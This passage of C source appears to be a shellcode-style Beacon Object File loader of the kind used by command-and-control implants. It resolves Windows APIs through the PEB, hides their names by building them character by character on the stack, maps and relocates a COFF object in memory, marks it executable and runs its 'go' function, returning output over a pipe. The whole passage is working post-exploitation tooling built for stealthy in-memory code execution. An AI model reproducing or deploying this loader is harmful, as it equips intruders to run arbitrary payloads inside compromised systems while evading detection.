    /* Trampolines: 12 bytes each for all symbols - page-aligned from sections */
    DWORD trampoline_offset = (total_sec_size + 0xFFF) & ~(DWORD)0xFFF;
    DWORD trampoline_size = num_syms * TRAMPOLINE_SIZE;

    /* IAT: 8 bytes each for __imp_ symbols (just allocate for all) */
    DWORD iat_offset = trampoline_offset + trampoline_size;
    DWORD iat_size = num_syms * 8;

    /* COMMON area: scan for COMMON symbols */
    DWORD common_offset = iat_offset + iat_size;
    DWORD common_size = 0;
    for (DWORD i = 0; i < num_syms; i++) {
        if (sym_table[i].SectionNumber == 0 &&
            sym_table[i].StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
            sym_table[i].Value > 0) {
            common_size += align16(sym_table[i].Value);
        }
        /* Skip aux symbols */
        i += sym_table[i].NumberOfAuxSymbols;
    }

    DWORD total_alloc = common_offset + common_size;
    if (total_alloc > MAX_COFF_ALLOC) return 7;

    /* ------------------------------------------------------------------- */
    /* VirtualAlloc single RW block                                        */
    /* ------------------------------------------------------------------- */
    BYTE* mem = (BYTE*)ctx->pVirtualAlloc(0, total_alloc, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/, 0x04 /*PAGE_READWRITE*/);
    if (!mem) return 8;

    /* ------------------------------------------------------------------- */
    /* Copy section data                                                   */
    /* ------------------------------------------------------------------- */
    BYTE* section_ptrs[MAX_SECTIONS];
    for (WORD i = 0; i < num_secs; i++) {
        section_ptrs[i] = mem + sec_offsets[i];
        if (sec_table[i].SizeOfRawData > 0 && sec_table[i].PointerToRawData > 0) {
            if (sec_table[i].PointerToRawData + sec_table[i].SizeOfRawData <= coff_len) {
                stub_memcpy(section_ptrs[i], coff_data + sec_table[i].PointerToRawData, sec_table[i].SizeOfRawData);
            }
        }
    }

    /* ------------------------------------------------------------------- */
    /* Resolve symbols and build func_ptrs                                 */
    /* func_ptrs[i] = resolved address for symbol i                        */
    /* ------------------------------------------------------------------- */

    /* VirtualAlloc for func_ptrs array (num_syms * 8 bytes) */
    void** func_ptrs = (void**)ctx->pVirtualAlloc(0, (SIZE_T)num_syms * 8, 0x3000, 0x04);
    if (!func_ptrs) {
        ctx->pVirtualFree(mem, 0, 0x8000 /*MEM_RELEASE*/);
        return 9;
    }
    stub_memset(func_ptrs, 0, (unsigned long long)num_syms * 8);

    BYTE* trampoline_ptr = mem + trampoline_offset;
    BYTE* iat_ptr = mem + iat_offset;
    BYTE* common_ptr = mem + common_offset;
    DWORD common_used = 0;

    void* go_entry = 0;
    char short_name_buf[9];

    for (DWORD i = 0; i < num_syms; i++) {
        COFF_SYM* sym = &sym_table[i];
        const char* sym_name = get_sym_name(sym, string_table, short_name_buf);

        if (sym->SectionNumber > 0 && sym->SectionNumber <= (SHORT)num_secs) {
            /* Defined in a section */
            func_ptrs[i] = section_ptrs[sym->SectionNumber - 1] + sym->Value;
        } else if (sym->SectionNumber == 0 && sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && sym->Value > 0) {
            /* COMMON symbol: allocate from common area */
            DWORD aligned_val = align16(sym->Value);
            func_ptrs[i] = common_ptr + common_used;
            common_used += aligned_val;
        } else if (sym->SectionNumber == 0 && sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL) {
            /* External: resolve via Beacon API / DFR */
            void* resolved = resolve_bof_symbol(sym_name, seh_handler);

            if (resolved) {
                /* Check if this is an __imp_ symbol -> IAT entry (pointer indirection) */
                if (sym_name[0] == '_' && sym_name[1] == '_' && sym_name[2] == 'i' &&
                    sym_name[3] == 'm' && sym_name[4] == 'p' && sym_name[5] == '_') {
                    /* IAT: store pointer in iat slot, func_ptrs points to the slot */
                    void** iat_slot = (void**)(iat_ptr + i * 8);
                    *iat_slot = resolved;
                    func_ptrs[i] = (void*)iat_slot;
                } else {
                    /* Trampoline: mov rax, imm64; jmp rax */
                    BYTE* t = trampoline_ptr + i * TRAMPOLINE_SIZE;
                    t[0] = 0x48; t[1] = 0xB8; /* mov rax, imm64 */
                    *(void**)(t + 2) = resolved;
                    t[10] = 0xFF; t[11] = 0xE0; /* jmp rax */
                    func_ptrs[i] = (void*)t;
                }
            } else {
                /* Unresolved: xor eax,eax; ret stub at trampoline */
                BYTE* t = trampoline_ptr + i * TRAMPOLINE_SIZE;
                t[0] = 0x31; t[1] = 0xC0; /* xor eax, eax */
                t[2] = 0xC3;              /* ret */
                func_ptrs[i] = (void*)t;
            }
        }

        /* Check for "go" or "_go" entry point */
        if (sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && sym->SectionNumber > 0) {
            if ((sym_name[0] == 'g' && sym_name[1] == 'o' && sym_name[2] == '\0') ||
                (sym_name[0] == '_' && sym_name[1] == 'g' && sym_name[2] == 'o' && sym_name[3] == '\0')) {
                go_entry = func_ptrs[i];
            }
        }

        /* Skip aux symbols */
        i += sym->NumberOfAuxSymbols;
    }

    if (!go_entry) {
        ctx->pVirtualFree(func_ptrs, 0, 0x8000);
        ctx->pVirtualFree(mem, 0, 0x8000);
        return 10;
    }

    /* ------------------------------------------------------------------- */
    /* Process relocations                                                 */
    /* ------------------------------------------------------------------- */
    for (WORD s = 0; s < num_secs; s++) {
        if (sec_table[s].NumberOfRelocations == 0) continue;
        if (sec_table[s].PointerToRelocations == 0) continue;

        DWORD reloc_off = sec_table[s].PointerToRelocations;
        if (reloc_off + sec_table[s].NumberOfRelocations * sizeof(COFF_RELOC) > coff_len) continue;

        COFF_RELOC* relocs = (COFF_RELOC*)(coff_data + reloc_off);
        BYTE* sec_base = section_ptrs[s];

        for (WORD r = 0; r < sec_table[s].NumberOfRelocations; r++) {
            COFF_RELOC* rel = &relocs[r];
            DWORD sym_idx = rel->SymbolTableIndex;
            if (sym_idx >= num_syms) continue;

            void* sym_addr = func_ptrs[sym_idx];
            if (!sym_addr) continue;

            BYTE* patch_site = sec_base + rel->VirtualAddress;
            long long target_addr = (long long)(unsigned long long)sym_addr;
            long long patch_addr  = (long long)(unsigned long long)patch_site;

            switch (rel->Type) {
                case IMAGE_REL_AMD64_ADDR64: {
                    long long existing = *(long long*)patch_site;
                    *(long long*)patch_site = target_addr + existing;
                    break;
                }
                case IMAGE_REL_AMD64_ADDR32NB: {
                    int existing = *(int*)patch_site;
                    *(int*)patch_site = (int)(target_addr - patch_addr + existing);
                    break;
                }
                case IMAGE_REL_AMD64_REL32: {
                    int existing = *(int*)patch_site;
                    *(int*)patch_site = (int)(target_addr - (patch_addr + 4) + existing);
                    break;
                }
                case IMAGE_REL_AMD64_REL32_1: {
                    int existing = *(int*)patch_site;
                    *(int*)patch_site = (int)(target_addr - (patch_addr + 5) + existing);
                    break;
                }
                case IMAGE_REL_AMD64_REL32_2: {
                    int existing = *(int*)patch_site;
                    *(int*)patch_site = (int)(target_addr - (patch_addr + 6) + existing);
                    break;
                }
                case IMAGE_REL_AMD64_REL32_3: {
                    int existing = *(int*)patch_site;
                    *(int*)patch_site = (int)(target_addr - (patch_addr + 7) + existing);
                    break;
                }
                case IMAGE_REL_AMD64_REL32_4: {
                    int existing = *(int*)patch_site;
                    *(int*)patch_site = (int)(target_addr - (patch_addr + 8) + existing);
                    break;
                }
                case IMAGE_REL_AMD64_REL32_5: {
                    int existing = *(int*)patch_site;
                    *(int*)patch_site = (int)(target_addr - (patch_addr + 9) + existing);
                    break;
                }
            }
        }
    }

    /* ------------------------------------------------------------------- */
    /* VirtualProtect executable sections + trampolines to RX              */
    /* ------------------------------------------------------------------- */
    for (WORD i = 0; i < num_secs; i++) {
        if (sec_table[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            DWORD old_prot;
            ctx->pVirtualProtect(section_ptrs[i], sec_sizes[i], 0x20 /*PAGE_EXECUTE_READ*/, &old_prot);
        }
    }

    /* Protect trampoline region as RX */
    if (trampoline_size > 0) {
        DWORD old_prot;
        ctx->pVirtualProtect(mem + trampoline_offset, trampoline_size, 0x20 /*PAGE_EXECUTE_READ*/, &old_prot);
    }

    /* ------------------------------------------------------------------- */
    /* Execute go(bof_args, args_len)                                      */
    /* ------------------------------------------------------------------- */
    fn_bof_go pfn_go = (fn_bof_go)go_entry;
    pfn_go(bof_args, (int)args_len);

    /* ------------------------------------------------------------------- */
    /* Cleanup                                                             */
    /* ------------------------------------------------------------------- */
    ctx->pVirtualFree(func_ptrs, 0, 0x8000 /*MEM_RELEASE*/);
    ctx->pVirtualFree(mem, 0, 0x8000 /*MEM_RELEASE*/);

    return 0;
}

/* ========================================================================= */
/* Main entry point                                                          */
/* ========================================================================= */

__attribute__((section(".text")))
DWORD WINAPI bof_entry(void* param) {

    /* ------------------------------------------------------------------- */
    /* Parse input data block                                              */
    /* ------------------------------------------------------------------- */
    unsigned char* data = (unsigned char*)param;
    DWORD bof_len  = *(DWORD*)(data);
    DWORD args_len = *(DWORD*)(data + 4);
    HANDLE pipe_handle = (HANDLE)*(unsigned long long*)(data + 8);
    BYTE* bof_data = data + 16;
    char* bof_args = (char*)(data + 16 + bof_len);

    /* ------------------------------------------------------------------- */
    /* Step 1: Get ntdll and kernel32 bases via PEB                        */
    /* ------------------------------------------------------------------- */
    void* ntdll_base = 0;
    void* k32_base   = 0;
    get_module_bases(&ntdll_base, &k32_base);

    /* ------------------------------------------------------------------- */
    /* Step 2: Resolve LoadLibraryA and GetProcAddress from kernel32       */
    /* ------------------------------------------------------------------- */

    /* "LoadLibraryA" on stack */
    char s_lla[13];
    s_lla[0]='L'; s_lla[1]='o'; s_lla[2]='a'; s_lla[3]='d';
    s_lla[4]='L'; s_lla[5]='i'; s_lla[6]='b'; s_lla[7]='r';
    s_lla[8]='a'; s_lla[9]='r'; s_lla[10]='y'; s_lla[11]='A';
    s_lla[12]='\0';

    /* "GetProcAddress" on stack */
    char s_gpa[15];
    s_gpa[0]='G'; s_gpa[1]='e'; s_gpa[2]='t'; s_gpa[3]='P';
    s_gpa[4]='r'; s_gpa[5]='o'; s_gpa[6]='c'; s_gpa[7]='A';
    s_gpa[8]='d'; s_gpa[9]='d'; s_gpa[10]='r'; s_gpa[11]='e';
    s_gpa[12]='s'; s_gpa[13]='s'; s_gpa[14]='\0';

    fn_LoadLibraryA  pLoadLibraryA  = (fn_LoadLibraryA)find_export(k32_base, s_lla);
    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)find_export(k32_base, s_gpa);
    if (!pLoadLibraryA || !pGetProcAddress) return 1;

    /* ------------------------------------------------------------------- */
    /* Step 3: Resolve additional kernel32 APIs via GetProcAddress          */
    /* ------------------------------------------------------------------- */

    /* "VirtualAlloc" */
    char s_va[13];
    s_va[0]='V'; s_va[1]='i'; s_va[2]='r'; s_va[3]='t';
    s_va[4]='u'; s_va[5]='a'; s_va[6]='l'; s_va[7]='A';
    s_va[8]='l'; s_va[9]='l'; s_va[10]='o'; s_va[11]='c';
    s_va[12]='\0';

    /* "VirtualProtect" */
    char s_vp[15];
    s_vp[0]='V'; s_vp[1]='i'; s_vp[2]='r'; s_vp[3]='t';
    s_vp[4]='u'; s_vp[5]='a'; s_vp[6]='l'; s_vp[7]='P';
    s_vp[8]='r'; s_vp[9]='o'; s_vp[10]='t'; s_vp[11]='e';
    s_vp[12]='c'; s_vp[13]='t'; s_vp[14]='\0';

    /* "VirtualFree" */
    char s_vf[12];
    s_vf[0]='V'; s_vf[1]='i'; s_vf[2]='r'; s_vf[3]='t';
    s_vf[4]='u'; s_vf[5]='a'; s_vf[6]='l'; s_vf[7]='F';
    s_vf[8]='r'; s_vf[9]='e'; s_vf[10]='e'; s_vf[11]='\0';

    /* "GetProcessHeap" */
    char s_gph[15];
    s_gph[0]='G'; s_gph[1]='e'; s_gph[2]='t'; s_gph[3]='P';
    s_gph[4]='r'; s_gph[5]='o'; s_gph[6]='c'; s_gph[7]='e';
    s_gph[8]='s'; s_gph[9]='s'; s_gph[10]='H'; s_gph[11]='e';
    s_gph[12]='a'; s_gph[13]='p'; s_gph[14]='\0';

    /* "HeapAlloc" */
    char s_ha[10];
    s_ha[0]='H'; s_ha[1]='e'; s_ha[2]='a'; s_ha[3]='p';
    s_ha[4]='A'; s_ha[5]='l'; s_ha[6]='l'; s_ha[7]='o';
    s_ha[8]='c'; s_ha[9]='\0';

    /* "HeapFree" */
    char s_hf[9];
    s_hf[0]='H'; s_hf[1]='e'; s_hf[2]='a'; s_hf[3]='p';
    s_hf[4]='F'; s_hf[5]='r'; s_hf[6]='e'; s_hf[7]='e';
    s_hf[8]='\0';

    /* "MultiByteToWideChar" */
    char s_mbtowc[20];
    s_mbtowc[0]='M'; s_mbtowc[1]='u'; s_mbtowc[2]='l'; s_mbtowc[3]='t';
    s_mbtowc[4]='i'; s_mbtowc[5]='B'; s_mbtowc[6]='y'; s_mbtowc[7]='t';
    s_mbtowc[8]='e'; s_mbtowc[9]='T'; s_mbtowc[10]='o'; s_mbtowc[11]='W';
    s_mbtowc[12]='i'; s_mbtowc[13]='d'; s_mbtowc[14]='e'; s_mbtowc[15]='C';
    s_mbtowc[16]='h'; s_mbtowc[17]='a'; s_mbtowc[18]='r'; s_mbtowc[19]='\0';

    /* "ExitThread" */
    char s_et[11];
    s_et[0]='E'; s_et[1]='x'; s_et[2]='i'; s_et[3]='t';
    s_et[4]='T'; s_et[5]='h'; s_et[6]='r'; s_et[7]='e';
    s_et[8]='a'; s_et[9]='d'; s_et[10]='\0';

    /* "WriteFile" */
    char s_wf[10];
    s_wf[0]='W'; s_wf[1]='r'; s_wf[2]='i'; s_wf[3]='t';
    s_wf[4]='e'; s_wf[5]='F'; s_wf[6]='i'; s_wf[7]='l';
    s_wf[8]='e'; s_wf[9]='\0';

    /* "GetStdHandle" */
    char s_gsh[13];
    s_gsh[0]='G'; s_gsh[1]='e'; s_gsh[2]='t'; s_gsh[3]='S';
    s_gsh[4]='t'; s_gsh[5]='d'; s_gsh[6]='H'; s_gsh[7]='a';
    s_gsh[8]='n'; s_gsh[9]='d'; s_gsh[10]='l'; s_gsh[11]='e';
    s_gsh[12]='\0';

    fn_VirtualAlloc       pVirtualAlloc   = (fn_VirtualAlloc)pGetProcAddress((HMODULE)k32_base, s_va);
    fn_VirtualProtect     pVirtualProtect = (fn_VirtualProtect)pGetProcAddress((HMODULE)k32_base, s_vp);
    fn_VirtualFree        pVirtualFree    = (fn_VirtualFree)pGetProcAddress((HMODULE)k32_base, s_vf);
    fn_GetProcessHeap     pGetProcessHeap = (fn_GetProcessHeap)pGetProcAddress((HMODULE)k32_base, s_gph);
    fn_HeapAlloc          pHeapAlloc      = (fn_HeapAlloc)pGetProcAddress((HMODULE)k32_base, s_ha);
    fn_HeapFree           pHeapFree       = (fn_HeapFree)pGetProcAddress((HMODULE)k32_base, s_hf);
    fn_MultiByteToWideChar pMBtoWC        = (fn_MultiByteToWideChar)pGetProcAddress((HMODULE)k32_base, s_mbtowc);
    fn_ExitThread         pExitThread     = (fn_ExitThread)pGetProcAddress((HMODULE)k32_base, s_et);
    fn_WriteFile          pWriteFile      = (fn_WriteFile)pGetProcAddress((HMODULE)k32_base, s_wf);
    fn_GetStdHandle       pGetStdHandle   = (fn_GetStdHandle)pGetProcAddress((HMODULE)k32_base, s_gsh);

    if (!pVirtualAlloc || !pVirtualProtect || !pVirtualFree ||
        !pGetProcessHeap || !pHeapAlloc || !pHeapFree || !pExitThread) return 2;

    HANDLE hHeap = pGetProcessHeap();
    if (!hHeap) return 3;

    /* ------------------------------------------------------------------- */
    /* Step 4: Resolve _vsnprintf from ntdll (export walk, NOT LoadLibraryA) */
    /* ------------------------------------------------------------------- */

    /* "_vsnprintf" */
    char s_vsn[11];
    s_vsn[0]='_'; s_vsn[1]='v'; s_vsn[2]='s'; s_vsn[3]='n';
    s_vsn[4]='p'; s_vsn[5]='r'; s_vsn[6]='i'; s_vsn[7]='n';
    s_vsn[8]='t'; s_vsn[9]='f'; s_vsn[10]='\0';

    fn_vsnprintf p_vsnprintf = (fn_vsnprintf)find_export(ntdll_base, s_vsn);

    /* ------------------------------------------------------------------- */
    /* Step 5: Resolve __C_specific_handler from ntdll                     */
    /* ------------------------------------------------------------------- */

    /* "__C_specific_handler" */
    char s_csh[21];
    s_csh[0]='_'; s_csh[1]='_'; s_csh[2]='C'; s_csh[3]='_';
    s_csh[4]='s'; s_csh[5]='p'; s_csh[6]='e'; s_csh[7]='c';
    s_csh[8]='i'; s_csh[9]='f'; s_csh[10]='i'; s_csh[11]='c';
    s_csh[12]='_'; s_csh[13]='h'; s_csh[14]='a'; s_csh[15]='n';
    s_csh[16]='d'; s_csh[17]='l'; s_csh[18]='e'; s_csh[19]='r';
    s_csh[20]='\0';

    void* seh_handler = find_export(ntdll_base, s_csh);

    /* ------------------------------------------------------------------- */
    /* Step 6: Use pipe handle passed from parent (not GetStdHandle)         */
    /* ------------------------------------------------------------------- */
    HANDLE hStdout = pipe_handle;

    /* ------------------------------------------------------------------- */
    /* Step 7: Initialize BOF_CTX, store in TEB                            */
    /* ------------------------------------------------------------------- */
    BOF_CTX ctx_storage;
    stub_memset(&ctx_storage, 0, sizeof(ctx_storage));

    ctx_storage.pLoadLibraryA      = pLoadLibraryA;
    ctx_storage.pGetProcAddress    = pGetProcAddress;
    ctx_storage.k32_base           = k32_base;
    ctx_storage.ntdll_base         = ntdll_base;
    ctx_storage.pVirtualAlloc      = pVirtualAlloc;
    ctx_storage.pVirtualProtect    = pVirtualProtect;
    ctx_storage.pVirtualFree       = pVirtualFree;
    ctx_storage.pHeapAlloc         = pHeapAlloc;
    ctx_storage.pHeapFree          = pHeapFree;
    ctx_storage.hHeap              = hHeap;
    ctx_storage.pMultiByteToWideChar = pMBtoWC;
    ctx_storage.pWriteFile         = pWriteFile;
    ctx_storage.hStdout            = hStdout;
    ctx_storage.p_vsnprintf        = p_vsnprintf;

    bof_set_ctx(&ctx_storage);

    /* ------------------------------------------------------------------- */
    /* Step 8: Allocate output buffer (4096 initial via HeapAlloc)          */
    /* ------------------------------------------------------------------- */
    ctx_storage.output_cap = 4096;
    ctx_storage.output = (char*)pHeapAlloc(hHeap, 0x8 /*HEAP_ZERO_MEMORY*/, ctx_storage.output_cap);
    ctx_storage.output_len = 0;

    /* ------------------------------------------------------------------- */
    /* Steps 9-11: Load COFF, resolve, relocate, execute                   */
    /* ------------------------------------------------------------------- */
    DWORD result = load_and_run_coff(bof_data, bof_len, bof_args, args_len, seh_handler);

    /* ------------------------------------------------------------------- */
    /* Step 12: Flush output buffer to stdout                              */
    /* ------------------------------------------------------------------- */
    if (ctx_storage.output && ctx_storage.output_len > 0 && pWriteFile && hStdout) {
        DWORD written = 0;
        pWriteFile(hStdout, ctx_storage.output, ctx_storage.output_len, &written, 0);
    }

    /* ------------------------------------------------------------------- */
    /* Step 13: Cleanup                                                    */
    /* ------------------------------------------------------------------- */
    if (ctx_storage.output) {
        pHeapFree(hHeap, 0, ctx_storage.output);
        ctx_storage.output = 0;
    }

    /* ------------------------------------------------------------------- */
    /* Step 14: ExitThread(0)                                              */
    /* ------------------------------------------------------------------- */
    if (pExitThread) {
        pExitThread(0);
    }

    return result;
}

} /* extern "C" */
